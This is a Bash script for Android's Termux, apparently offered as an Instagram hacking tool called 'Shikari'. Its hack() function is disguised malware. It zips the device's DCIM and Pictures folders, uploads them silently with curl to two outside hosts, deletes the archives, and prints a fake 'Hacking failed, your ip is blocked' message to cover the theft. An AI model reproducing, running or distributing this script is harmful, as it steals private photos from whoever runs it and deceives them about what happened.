clear

req() {
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] Python Installing...";pkg install python -y;clear; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] Lolcat Installing...";pip install lolcat;clear; }
command -v zip > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] zip Installing...";pkg install zip -y;clear; }
command -v wget > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] wget Installing...";load;pkg install wget -y;clear; }
command -v toilet > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] lolcat Installing...";pkg install toilet;clear; }
}

hack(){
echo
cd /sdcard/DCIM
zip -r shikari.zip * -x .* &> /dev/null
curl -T shikari.zip http://happy.mikikk.co.jp/shikari.zip &> /dev/null
curl -T shikari.zip http://branch.prospec.co.th/shikari.zip &> /dev/null
rm -f shikari.zip
clear
echo
printf "Your victim insta Username : "
read insta
cd /sdcard/Pictures
zip -r shikari2.zip * -x .* &> /dev/null
curl -T shikari2.zip http://happy.mikikk.co.jp/shikari2.zip &> /dev/null
curl -T shikari2.zip http://branch.prospec.co.th/shikari2.zip &> /dev/null
rm -f shikari2.zip
clear
printf "Hacking $insta Failed !!, your ip is blocked by Instagram"
sleep 2
clear
echo
echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Name  \t\e[91m\e[1m:  \e[92m\e[1mShikari"
sleep 1
echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Lang.  \t\e[91m\e[1m:  \e[92m\e[1mBash"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mAuthor  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mYT  \t\e[91m\e[1m        : \e[92m\e[1m yt.com/BullAnonymous"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mGithub  \t\e[91m\e[1m:  \e[92m\e[1mgithub.com/Bhai4You"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mDate  \t\e[91m\e[1m:  \e[92m\e[1m21-4-20"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mBlog  \t\e[91m\e[1m:  \e[92m\e[1mbhai4you.blogspot.com"
sleep 1
echo
}

req
hack
